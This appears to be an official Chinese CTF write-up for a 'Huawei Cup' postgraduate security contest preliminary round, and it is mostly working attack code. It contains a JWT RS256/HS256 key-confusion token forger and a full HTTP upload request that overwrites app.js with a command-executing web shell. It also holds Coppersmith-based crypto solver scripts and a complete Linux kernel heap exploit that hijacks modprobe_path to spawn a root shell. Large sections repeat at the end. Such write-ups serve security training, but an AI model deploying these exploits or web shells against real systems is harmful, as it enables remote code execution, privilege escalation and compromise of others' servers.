# 官方WP（二）｜“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛

> 原文: https://www.ctfiot.com/75798.html
> ID: 75798

app.js

var express = require('express');
var path = require('path');
var fs = require("fs");
var createError = require('http-errors');
var { expressjwt } = require("express-jwt");
var multer = require("multer");
var cookieParser = require('cookie-parser');
var logger = require('morgan');

var indexRouter = require('./routes/index');
var apiRouter = require('./routes/api');

var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'twig');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.use(multer({ dest: '/tmp' }).array("file"));

var publicKey = fs.readFileSync('./config/public.pem');    // jwt解密阶段使用公钥
app.use(expressjwt({ secret: publicKey, algorithms: ["HS256", "RS256"]}).unless({ path: ["/", "/api/login"] }))

app.use(function(req, res, next) {    // 这一中间件对get、post，auth的数据进行过滤，过滤了危险字符和关键字
  if([req.body, req.query, req.auth, req.headers].some(function(item) {
      console.log(req.auth)
      return item && /../|proc|public|routes|.js|cron|views/img.test(JSON.stringify(item));
  })) {
      return res.status(403).send('illegal data.');
  } else {
      next();
  };
});

app.use('/', indexRouter);
app.use('/api', apiRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

var server = app.listen(8000, function () {

  var host = server.address().address
  var port = server.address().port

  console.log("Application instance, the access address is http://%s:%s", host, port)
});

关键代码如下：

app.use(function(req, res, next) {    // 这一中间件对get、post，auth的数据进行过滤，过滤了危险字符和关键字
  if([req.body, req.query, req.auth, req.headers].some(function(item) {
      console.log(req.auth)
      return item && /../|proc|public|routes|.js|cron|views/img.test(JSON.stringify(item));
  })) {
      return res.status(403).send('illegal data.');
  } else {
      next();
  };
});

这一中间件对get、post，auth的数据进行过滤，过滤了危险字符和关键字。

api.js

var express = require('express');
var fs = require("fs");
var jwt = require("jsonwebtoken");
var path = require('path');

var router = express.Router();

var privateKey = fs.readFileSync('./config/private.pem');    // jwt加密使用私钥

router.post('/login', function(req, res, next) {
  const token = jwt.sign({ username: req.body.username, isAdmin: false, home: req.body.username }, privateKey, { algorithm: "RS256" });
  res.send({
    status:
200,
    msg:"success",
    token
  })
})

router.post('/upload', function(req, res, next) {
  if(req.files.length !== 0) {
    var savePath = '';
    if(req.auth.isAdmin === false) {
      var dirName = `./public/upload/${req.auth.home}/`
      fs.mkdir(dirName, (err)=>{
        if(err) {
          console.log('error')
        } else {
          console.log('ok')
        }
      });
      savePath = path.join(dirName, req.files[0].originalname);
    } else if(req.auth.isAdmin === true) {
      savePath = req.auth.home;    // 漏洞点
    }

    fs.readFile(req.files[0].path, function(err, data) {
      if(err) {
        return res.status(500).send("error");
      } else {
        fs.writeFileSync(savePath, data);
      }
    });
    return res.status(200).send("file upload successfully");
  } else {
    return res.status(500).send("error");
  }
});

module.exports = router;

整个项目使用了jwt，并且加密方法为非对称加密算法RS256，但是在解密过程中可以使用对称加密算法HS256，这就造成了密钥混淆攻击：

var express = require('express');
var fs = require("fs");
var jwt = require("jsonwebtoken");
var path = require('path');

var app = express();

var publicKey = fs.readFileSync('./public.pem');

app.get('/', function(req, res, next) {
  const token = jwt.sign({ username: "admin", isAdmin: true, home: {
    href: "a",
    origin: "a",
    protocol: "file:",
    hostname: "",
    pathname: "app%2e%6a%73"
  } }, publicKey, { algorithm: "HS256" });
  res.send({
    token
  })
})

var server = app.listen(8000, function () {

    var host = server.address().address
    var port = server.address().port

    console.log("Application instance, the access address is http://%s:%s", host, port)
  });

POST /upload HTTP/1.1
Host: host
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaG9tZSI6eyJocmVmIjoiYSIsIm9yaWdpbiI6ImEiLCJwcm90b2NvbCI6ImZpbGU6IiwiaG9zdG5hbWUiOiIiLCJwYXRobmFtZSI6ImFwcCUyZSU2YSU3MyJ9LCJpYXQiOjE2NjQzOTAxMDJ9.xnPaQ0sv8ExJIqmUdprvOK18pqY6uff9CLvHU8zAAwE
Connection: close
Content-Length: 619
Content-Type: multipart/form-data; boundary=e6a70575f2b3431196ed9ea9baa5f630

--e6a70575f2b3431196ed9ea9baa5f630
Content-Disposition: form-data; name="file"; filename="check.js"
Content-Type: text/plain

var express = require('express');
var process = require('child_process')
var app = express();

app.get('/', function(req, res) {
    var result = process.execSync(req.query.cmd).toString();
    return res.send(result);
});

var server = app.listen(8000, function () {
    var host = server.address().address
    var port = server.address().port
    console.log("Application instance, the access address is http://%s:%s", host, port)
});
--e6a70575f2b3431196ed9ea9baa5f630--

breakMe

首先拿到题，审题发现题目中给出了一个可疑的leak函数，每次会return一些信息：(n, r, enc)，其中：

，

 都是随机的256bit的素数，

，

.

在题目中，我们获取到了4组leak函数的返回值，不难发现，每次的
都不一样，而且多项式的次数也为4，这不得不让人想到在RSA中，存在着广播攻击的方法，那么Håstad's broadcast attack的扩展形式正是本题的考点：在Wikipedia的coppersmith词条中，我们可以看到这种与coppersmith结合的攻击方法：https://en.wikipedia.org/wiki/Coppersmith%27s_attack

简述一下就是：我们可以利用CRT找到每个多项式

的系数

满足.这里的

即是我们题目中的enc所处多项式，也就是。并且构造

, 而且显然

，因此对

在

上利用coppersmith求small_roots即可求解出m，不过界卡的有些严格，需要根据flag格式flag{xxxx}来缩小一下所求bit数。

from Crypto.Util.number import *
from libnum import *

out = [(10104838556837572425858698219763292763650577822827673166610165534445905790599515983298170585537299796651687586519310335005278459900442296258190069157011689, 7564828531806668305145314143078783846371361009728098013923139274278986668460078185780789906860320972246757193033127803017086784149355945294908935420078516, 4485282300120902750491340174759104149475684698869265622396467866957919693682690175170986883471126578030682174788280328493147605703476577928850956031397969), (9565548877530896106016727232483590558935243658719980153279803247495028412133813638614011877483865630231054031084370990573419237535803428480492680139453999, 6038408119341558448569646184012774768725225345959109849115178440273061081156678389998969575922258723126076562743356339971035685064411166619777569139016508, 8750745342976938305411200510628417969404035221738007736422965823102502205577159397824830272988223657169242542971101468532748569435454625452166610190128781), (7032132827543709857775159929155596851822367214393091928329402747976746664890617830698759196796244901655353689522245761374585849734855765538189679713755499, 537414417641982152632158507627084083552317654751808484984901390258392606135955264531766980767789787016920198980507584546004466948509548457976277102756022, 6922262573315623933995838201220725774224132378664014973566219095767042719198956812716498145319448424126056354168025846702083830628832406132772890238012895), (10867950060245850877527719152309028431430000864654153258281294463898174216443333061889067616907305797497470525064325706490087786413068565388484751510567929, 2817477928396391253997165521234258370798748353920680581012362899514855249356663733557730846938679462940826446464369055820695102402810943359431061366297287, 6437402158704542412615350656111816825238327397134975867813883010385929819022183388539677074062781989152267579279340992202100004308737301019250714974969949)]

# clean data
ns = [o[0] for o in out]
rs = [o[1] for o in out]
cs = [o[2] for o in out]

# calculate T_i for each polynomial
calcT = lambda idx : crt([0 if i != idx else 1 for i in range(4)], ns)

# calculate Ts
T = [calcT(i) for i in range(len(ns))]

# construct the final polynomial
f = 0
P.<x> = PolynomialRing(Zmod(prod(ns)))

# use pad to add known bits
pad = bytes_to_long(b'flag{' + b'x00' * 58)
m = x + pad

# construct g(x)
for i in range(4):
    f += T[i] * (m^4 + 3*m^2 + rs[i]*m - cs[i])
root = f.small_roots(X=2^464, epsilon=0.03)[0]
m = m(root)
print(long_to_bytes(int(m)))

from Crypto.Util.number import *

N = [7834852404690613421430169663612203646364286385985089874202019066309609197617451690988793560462179054987116479700769830549608039683656465594954511680417439827884682514137395099618980184523220683344996556134367140942117294093697944691881733841814807163442986266436501188979024846961439278137438956993286762327, 56294620872968718380397963653042708970679997991074373308327166468889019728428695832974471693865711660199765275543574607777072876711036238547682259596299830777636017508061107901637637285281716996357267778844219142268259492772365960388947511378141363201796810931407918179374553857261098454741363722931008506489, 129957982988172364798440102561140523140644973971267372222458834449933213209554347296288675182049584297578956734950355730140774286965046426714693180361079049463593214844598178841579717839460125946223610814809560801920675773424029429584993267487434123215947150197664528709696606034737478716163854006621716785991, 9066055260883591502053070869551945047692654206920946891326048741423436599435774484763722715368827203845612354403468594494511688795068051140777669329826790833884137019297335832118519149000495203691914082887641717032244953119788416874814325467577437200429867014461247963978079935867875238778711836684201288629]
a = [7048154001918995017477365250721440939846406590540353416820154008187139217962602433154255479524221017573932812808705559493957586212577760267599598714536291727239485215656286274781121306887482105659998955359830778419337539924176135760285232988635633360704580265662170937825877189245474738393021110026742102153, 31321627825577613037613808260049947007597426398894543343295026929881402452208952913568802715190246106852599964881281443228975390464866025563219146668773014384534545192472026458279658043212752646582216269356048760074676973727755420979369317926774191804078299545532996426124351002568625497764155513252011538383, 100376678530410393440129444794028270589837686585546722960835863526622361668168592119632678982588964433092332436582055706812912246068983186060549127456588081281709747489416102968621180956752592139190805283441881388281289967907267811700783042913976898959346128092682283410576618008749415379182268334407914148254, 6943832903409991642828570302536131525128645753930793106382906368952726384077421186255403537931046135925451476048548017535373288933816332713598232518007018014021815609935851599706943287432440225704733070091400716880400394526448257123585228314673632971354933209639455109919401694778978191398135174777533045403]
b = [4272068648071168554128636586350467405009694241694262836849423155558524145309230653833900842480890062328504409347247873131227928999434917761846296010735220794539754754709781832591462658606731823437811260960368913997315971957378706774967707190047218973326733836134154328499864695789950910713523349012474450864, 11929895073032022513957831520065553727240314640963946035392521145067403043568103057789780858770584336171401618656230002952248952501656323696171128964091972452983219532076399819635525501541575635759478775528763593811199873333060757002721704633920964694387555113420556152094378726220099897441805429281932182249, 103479492760868255868822251568430728660153846040468623291049762149835619268304116069175027462824325373424329188452060129997748026322908351085116208712488124073324734412873332262218458728286795171892582854096835272404670621882642310331656668706237434350806299564270634718815297722496881546541557249523300668419, 7649214589736145661339350025603766052029302867406177205198200412263344904792642202923484806907193137271787655081123837667924783972976687435768372148142019805960085696461852811862193410065098094960702563602088132165333080687485869630334541488910322456467515098185301836641936447884084214487374441279192233849]
y = [4806088655232032640131815968035322182275006692259183095737832095267524825650586709163929120708376642687256768447965710629080349200588181928595678047040880789724971817059358396163096713153272213427522822058891798994246279675546478741928529988967946204452767371906673286827596885891268683555890521866220464996, 36427308113569747526874637238611956674658176451423982942908576371079856193061929116763841738289478269762767309956202920564091203721624520590467722449528903731839566008139942787078693680673776528179554827688651298887826999553050429188191123121557929147839173277183786286467590000199719564184235204795732718072, 22671172019607699010808242481239740857130309731255435371908887956593421434992512079790234625706350568447858868609783480724200167840452748080516811720426420974312708628131116060025172282266118472961472876873141994049733918908550242475246834408823242506072794063563809180873166212417405862218538966602792514167, 644361727747632626598826890581163999609668835723437298040290901674278545143549378125708738964569230174723374335762192451734784904542916232268939865691930798231529455733298867239440319451124463937678028231210599360468666533601195511935168705936295829890653739823139986804039319543460282204539256406399080821]

def paragen(x0,a,b,y,n):
    return [int(i%n) for i in [x0*x0*x0+a*x0+b-y*y,3*x0*x0+a,3*x0]]

x0 = bytes_to_long(b'flag{' + b'x00'*123)
cnt = 0
PR.<x> = PolynomialRing(Zmod(prod(N)))
for s in range(20):
    print(s)
    for i in range(s+1):
        for j in range(s-i+1):
            f0 = paragen(x0,a[0],b[0],y[0],N[0])
            f1 = paragen(x0+i,a[1],b[1],y[1],N[1])
            f2 = paragen(x0+i+j,a[2],b[2],y[2],N[2])
            f3 = paragen(x0+s,a[3],b[3],y[3],N[3])
            f = x^3 + sum([crt([f0[i],f1[i],f2[i],f3[i]],N)*x^i for i in range(3)])
            ans = f.small_roots(X=2**984)
            if ans:
                print(s,i,j,ans)
                for k in ans:
                    print(long_to_bytes(x0+k))

#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include 
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include 
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <stdint.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/prctl.h>
#define SIZE 0x60
size_t user_cs, user_ss, user_rflags, user_sp;
size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t vmlinux_base = 0;
long int data[0x400];
size_t modprobe_path = 0;
uint64_t kernel_base = 0;
uint64_t raceSign = 0;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void get_shell(void){
    system("/bin/sh");
}

void getroot()
{
    void *(*pkc)(void *) = prepare_kernel_cred;
    void (*cc)(void *) = commit_creds;

    cc(pkc(0));
}
void swapgs_iretq()
{
    __asm__("swapgs;"
            "iretq;");
}
void spawn_shell()
{    
    system("/bin/sh");
}
int add(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x20,arg);
}
int del(int fd,uint64_t idx){
    uint64_t arg[1] = {idx};
    ioctl(fd,0x30,arg);
}
int edit(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x40,arg);
}
struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct {
  long mtype;
  char mtext[0x4000];
} msgbuf;

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

int add_msg(int msqid, const void *msgp, size_t msgsz) {
    if (msgsnd(msqid, msgp, msgsz, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    return 0;
}

int show_msg(int msqid, void *msgp, size_t msgsz,long count) {
    if (msgrcv(msqid, msgp, msgsz, count, MSG_COPY | IPC_NOWAIT) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, 0) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}
int msg_get(){
    int pid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(pid < 0){
        perror("msgget");
        return -1;
    }
    return pid;
}
int show_buf(uint64_t *buf,uint64_t size){
    for(int i = 0;i<size;i++){
        printf("%d ==> %llxn",i,*(uint64_t*)(buf + i*8));
    }
}
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}
void modprobe_hax()
{
        system("echo '#!/bin/sh' > /tmp/x; echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
        system("chmod +x /tmp/x");
        int ff = open("/tmp/asd", O_WRONLY|O_CREAT);
        write(ff, "xffxffxffxff", 4);
        close(ff);
        system("chmod 777 /tmp/asd; /tmp/asd");
        system("sh");
}
uint64_t pop_rdi,pop_rsi,pop_rdx,swapgs,iretq,jmp_rsi,leaver,work_for_cpu_fn;
uint64_t tmp_idx,tmp_idx1;
int fd;
int main(){
    signal(SIGSEGV, spawn_shell);
    signal(SIGTRAP, spawn_shell);
    save_status();
    fd = open("/dev/kernelpwn",0);
    if(fd < 0){
        puts("Open Error");
        _exit(1);
    }
    char *buf = calloc(1,0x4000);
    memset(buf,'b',0x1000);
    int pid[0x100] = {0};
    for(int i = 0;i<100;i++){
        pid[i] = msg_get();
    }
    add(fd,buf);
    msgbuf.mtype = 0x66;
    memset(msgbuf.mtext,'a',0x100);
    if (msgsnd(pid[0], &msgbuf, 0x60-0x30, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    del(fd,0);
    if (msgsnd(pid[1], &msgbuf, 0x60-0x30, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    msgbuf.mtype = 0x2;
    memset(msgbuf.mtext,'a',0x100);
    if (msgsnd(pid[0], &msgbuf, 0x80-0x30, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    if (msgsnd(pid[1], &msgbuf, 0x80-0x30, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    edit(fd,'x00');
    free_msg(pid[1],buf,0x80-0x30,0x2);
    *(uint64_t*)buf = NULL; //rdx
    *(uint64_t*)(buf+8*1) = NULL;//rax
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x1000-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    setxattr("/tmp","aaaa",buf,0x80,1);
    memset(buf,'x00',0x1000);
    show_msg(pid[1],buf,0x1000-0x30,1);
       uint64_t heap_addr = *(uint64_t*)(buf + 11*8);
       printf("heap_addr => %llxn",heap_addr);
       if(heap_addr == 0){
           puts("NONONO");
           _exit(0);
       }
       uint64_t heap_base = heap_addr & 0xfffffffff0000000;
       int off = 0;
    while(!(heap_addr >> (32 - off*8) & 2)) ++off;
    *(uint64_t*)buf = heap_addr; //rdx
    *(uint64_t*)(buf+8*1) = heap_base + 0x11e89d0 + off;//rax
    *(uint64_t*)(buf+8*2) = 2;
    *(uint64_t*)(buf+8*3) = 0x80-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    setxattr("/tmp","aaaa",buf,0x80,1);
    free_msg(pid[1],buf,0x80-0x30,2);
    int fd1 = open("/proc/sys/kernel/modprobe",O_WRONLY);
    if(fd1 < 0){
        perror("open");
        _exit(0);
    }
    write(fd1, "/tmp/x", 6);
    modprobe_hax();
    spawn_shell();

}

__int64 sub_7F9()
{
  close(1);
  close(2);
  return sub_7CA();
}

1.需要用到天堂之门切换位数绕过系统调用号检测，在这之前需要用mmap开启一段可执行空间，直接在栈上执行天堂之门会无法执行
2.在mmap出来的区段写上32 to 64的天堂之门shellcode然后open flag 和run.sh(或者pwn文件)
接着再用64 to 32的天堂之门切换到64位把flag读入到mmap区段，再接着切换到32位把flag write到run.sh(或者pwn文件)
3.由于程序有Xinetd守护进程，不会导致容器重置，下次nc直接get flag

08049857                 cmovnz  edx, edi

0804990D                 xor     [eax+edx*4+10h], ecx

[0, 10, 7, 1, 29, 37, 9, 8, 1, 20, 7, 
    18, 28, 51, 33, 19, 3, 21, 21, 3, 2, 47, 18, 37, 9, 20, 20, 3, 5, 18, 10, 10, 31, 27]

>>> arr = [0, 10, 7, 1, 29, 37, 9, 8, 1, 20, 7,
...     18, 28, 51, 33, 19, 3, 21, 21, 3, 2, 47, 18, 37, 9, 20, 20, 3, 5, 18, 10, 10, 31, 27]
>>> flag = bytes([each ^ 0x66 for each in arr])
>>> flag
b'flag{CongratzUGuessedItCorrectlly}'

003480CD     | 8B4D 08           | mov ecx,dword ptr ss:[ebp+8]                |
003480D0     | C70424 0A000000   | mov dword ptr ss:[esp],A                    | A:'n'
003480D7     | 894C24 04         | mov dword ptr ss:[esp+4],ecx                |
003480DB     | 894424 08         | mov dword ptr ss:[esp+8],eax                |
003480DF     | E8 0C000000       | call truevm.3480F0                        |
003480E4     | 83C4 10           | add esp,10                                  |
003480E7     | 5D                | pop ebp                                     |
003480E8     | C3                | ret                                         |
003480E9     | 0F1F80 00000000   | nop dword ptr ds:[eax],eax                  |
003480F0     | E9 A1803000       | jmp truevm.650196                         |

.truevm.exe
ef631455b1274f21a6c26f87332d8a22
Correct
flag{ef631455b1274f21a6c26f87332d8a22}

+ + + + + + + + + + +

✦  +

+

有话说

如果您有比赛想要宣传，欢迎联系我们刊登发布

如果您想练习历史大赛CTF题目，欢迎体验演武场

扫描关注下方春秋GAME官方公众号

发送“了解”两字即可了解更多以及加入春秋赛事宇宙官方微信群

春秋GAME期待与您的见面~~~

+ + + + + + + + + + +


```
var express = require('express');
var path = require('path');
var fs = require("fs");
var createError = require('http-errors');
var { expressjwt } = require("express-jwt");
var multer = require("multer");
var cookieParser = require('cookie-parser');
var logger = require('morgan');

var indexRouter = require('./routes/index');
var apiRouter = require('./routes/api');

var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'twig');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.use(multer({ dest: '/tmp' }).array("file"));

var publicKey = fs.readFileSync('./config/public.pem');    // jwt解密阶段使用公钥
app.use(expressjwt({ secret: publicKey, algorithms: ["HS256", "RS256"]}).unless({ path: ["/", "/api/login"] }))

app.use(function(req, res, next) {    // 这一中间件对get、post，auth的数据进行过滤，过滤了危险字符和关键字
  if([req.body, req.query, req.auth, req.headers].some(function(item) {
      console.log(req.auth)
      return item && /../|proc|public|routes|.js|cron|views/img.test(JSON.stringify(item));
  })) {
      return res.status(403).send('illegal data.');
  } else {
      next();
  };
});

app.use('/', indexRouter);
app.use('/api', apiRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

var server = app.listen(8000, function () {

  var host = server.address().address
  var port = server.address().port

  console.log("Application instance, the access address is http://%s:%s", host, port)
});
app.use(function(req, res, next) {    // 这一中间件对get、post，auth的数据进行过滤，过滤了危险字符和关键字
  if([req.body, req.query, req.auth, req.headers].some(function(item) {
      console.log(req.auth)
      return item && /../|proc|public|routes|.js|cron|views/img.test(JSON.stringify(item));
  })) {
      return res.status(403).send('illegal data.');
  } else {
      next();
  };
});
var express = require('express');
var fs = require("fs");
var jwt = require("jsonwebtoken");
var path = require('path');

var router = express.Router();

var privateKey = fs.readFileSync('./config/private.pem');    // jwt加密使用私钥

router.post('/login', function(req, res, next) {
  const token = jwt.sign({ username: req.body.username, isAdmin: false, home: req.body.username }, privateKey, { algorithm: "RS256" });
  res.send({
    status:
200,
    msg:"success",
    token
  })
})

router.post('/upload', function(req, res, next) {
  if(req.files.length !== 0) {
    var savePath = '';
    if(req.auth.isAdmin === false) {
      var dirName = `./public/upload/${req.auth.home}/`
      fs.mkdir(dirName, (err)=>{
        if(err) {
          console.log('error')
        } else {
          console.log('ok')
        }
      });
      savePath = path.join(dirName, req.files[0].originalname);
    } else if(req.auth.isAdmin === true) {
      savePath = req.auth.home;    // 漏洞点
    }

    fs.readFile(req.files[0].path, function(err, data) {
      if(err) {
        return res.status(500).send("error");
      } else {
        fs.writeFileSync(savePath, data);
      }
    });
    return res.status(200).send("file upload successfully");
  } else {
    return res.status(500).send("error");
  }
});

module.exports = router;
var express = require('express');
var fs = require("fs");
var jwt = require("jsonwebtoken");
var path = require('path');

var app = express();

var publicKey = fs.readFileSync('./public.pem');

app.get('/', function(req, res, next) {
  const token = jwt.sign({ username: "admin", isAdmin: true, home: {
    href: "a",
    origin: "a",
    protocol: "file:",
    hostname: "",
    pathname: "app%2e%6a%73"
  } }, publicKey, { algorithm: "HS256" });
  res.send({
    token
  })
})

var server = app.listen(8000, function () {

    var host = server.address().address
    var port = server.address().port

    console.log("Application instance, the access address is http://%s:%s", host, port)
  });
POST /upload HTTP/1.1
Host: host
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaG9tZSI6eyJocmVmIjoiYSIsIm9yaWdpbiI6ImEiLCJwcm90b2NvbCI6ImZpbGU6IiwiaG9zdG5hbWUiOiIiLCJwYXRobmFtZSI6ImFwcCUyZSU2YSU3MyJ9LCJpYXQiOjE2NjQzOTAxMDJ9.xnPaQ0sv8ExJIqmUdprvOK18pqY6uff9CLvHU8zAAwE
Connection: close
Content-Length: 619
Content-Type: multipart/form-data; boundary=e6a70575f2b3431196ed9ea9baa5f630

--e6a70575f2b3431196ed9ea9baa5f630
Content-Disposition: form-data; name="file"; filename="check.js"
Content-Type: text/plain

var express = require('express');
var process = require('child_process')
var app = express();

app.get('/', function(req, res) {
    var result = process.execSync(req.query.cmd).toString();
    return res.send(result);
});

var server = app.listen(8000, function () {
    var host = server.address().address
    var port = server.address().port
    console.log("Application instance, the access address is http://%s:%s", host, port)
});
--e6a70575f2b3431196ed9ea9baa5f630--
from Crypto.Util.number import *
from libnum import *

out = [(10104838556837572425858698219763292763650577822827673166610165534445905790599515983298170585537299796651687586519310335005278459900442296258190069157011689, 7564828531806668305145314143078783846371361009728098013923139274278986668460078185780789906860320972246757193033127803017086784149355945294908935420078516, 4485282300120902750491340174759104149475684698869265622396467866957919693682690175170986883471126578030682174788280328493147605703476577928850956031397969), (9565548877530896106016727232483590558935243658719980153279803247495028412133813638614011877483865630231054031084370990573419237535803428480492680139453999, 6038408119341558448569646184012774768725225345959109849115178440273061081156678389998969575922258723126076562743356339971035685064411166619777569139016508, 8750745342976938305411200510628417969404035221738007736422965823102502205577159397824830272988223657169242542971101468532748569435454625452166610190128781), (7032132827543709857775159929155596851822367214393091928329402747976746664890617830698759196796244901655353689522245761374585849734855765538189679713755499, 537414417641982152632158507627084083552317654751808484984901390258392606135955264531766980767789787016920198980507584546004466948509548457976277102756022, 6922262573315623933995838201220725774224132378664014973566219095767042719198956812716498145319448424126056354168025846702083830628832406132772890238012895), (10867950060245850877527719152309028431430000864654153258281294463898174216443333061889067616907305797497470525064325706490087786413068565388484751510567929, 2817477928396391253997165521234258370798748353920680581012362899514855249356663733557730846938679462940826446464369055820695102402810943359431061366297287, 6437402158704542412615350656111816825238327397134975867813883010385929819022183388539677074062781989152267579279340992202100004308737301019250714974969949)]

# clean data
ns = [o[0] for o in out]
rs = [o[1] for o in out]
cs = [o[2] for o in out]

# calculate T_i for each polynomial
calcT = lambda idx : crt([0 if i != idx else 1 for i in range(4)], ns)

# calculate Ts
T = [calcT(i) for i in range(len(ns))]

# construct the final polynomial
f = 0
P.<x> = PolynomialRing(Zmod(prod(ns)))

# use pad to add known bits
pad = bytes_to_long(b'flag{' + b'x00' * 58)
m = x + pad

# construct g(x)
for i in range(4):
    f += T[i] * (m^4 + 3*m^2 + rs[i]*m - cs[i])
root = f.small_roots(X=2^464, epsilon=0.03)[0]
m = m(root)
print(long_to_bytes(int(m)))
from Crypto.Util.number import *

N = [7834852404690613421430169663612203646364286385985089874202019066309609197617451690988793560462179054987116479700769830549608039683656465594954511680417439827884682514137395099618980184523220683344996556134367140942117294093697944691881733841814807163442986266436501188979024846961439278137438956993286762327, 56294620872968718380397963653042708970679997991074373308327166468889019728428695832974471693865711660199765275543574607777072876711036238547682259596299830777636017508061107901637637285281716996357267778844219142268259492772365960388947511378141363201796810931407918179374553857261098454741363722931008506489, 129957982988172364798440102561140523140644973971267372222458834449933213209554347296288675182049584297578956734950355730140774286965046426714693180361079049463593214844598178841579717839460125946223610814809560801920675773424029429584993267487434123215947150197664528709696606034737478716163854006621716785991, 9066055260883591502053070869551945047692654206920946891326048741423436599435774484763722715368827203845612354403468594494511688795068051140777669329826790833884137019297335832118519149000495203691914082887641717032244953119788416874814325467577437200429867014461247963978079935867875238778711836684201288629]
a = [7048154001918995017477365250721440939846406590540353416820154008187139217962602433154255479524221017573932812808705559493957586212577760267599598714536291727239485215656286274781121306887482105659998955359830778419337539924176135760285232988635633360704580265662170937825877189245474738393021110026742102153, 31321627825577613037613808260049947007597426398894543343295026929881402452208952913568802715190246106852599964881281443228975390464866025563219146668773014384534545192472026458279658043212752646582216269356048760074676973727755420979369317926774191804078299545532996426124351002568625497764155513252011538383, 100376678530410393440129444794028270589837686585546722960835863526622361668168592119632678982588964433092332436582055706812912246068983186060549127456588081281709747489416102968621180956752592139190805283441881388281289967907267811700783042913976898959346128092682283410576618008749415379182268334407914148254, 6943832903409991642828570302536131525128645753930793106382906368952726384077421186255403537931046135925451476048548017535373288933816332713598232518007018014021815609935851599706943287432440225704733070091400716880400394526448257123585228314673632971354933209639455109919401694778978191398135174777533045403]
b = [4272068648071168554128636586350467405009694241694262836849423155558524145309230653833900842480890062328504409347247873131227928999434917761846296010735220794539754754709781832591462658606731823437811260960368913997315971957378706774967707190047218973326733836134154328499864695789950910713523349012474450864, 11929895073032022513957831520065553727240314640963946035392521145067403043568103057789780858770584336171401618656230002952248952501656323696171128964091972452983219532076399819635525501541575635759478775528763593811199873333060757002721704633920964694387555113420556152094378726220099897441805429281932182249, 103479492760868255868822251568430728660153846040468623291049762149835619268304116069175027462824325373424329188452060129997748026322908351085116208712488124073324734412873332262218458728286795171892582854096835272404670621882642310331656668706237434350806299564270634718815297722496881546541557249523300668419, 7649214589736145661339350025603766052029302867406177205198200412263344904792642202923484806907193137271787655081123837667924783972976687435768372148142019805960085696461852811862193410065098094960702563602088132165333080687485869630334541488910322456467515098185301836641936447884084214487374441279192233849]
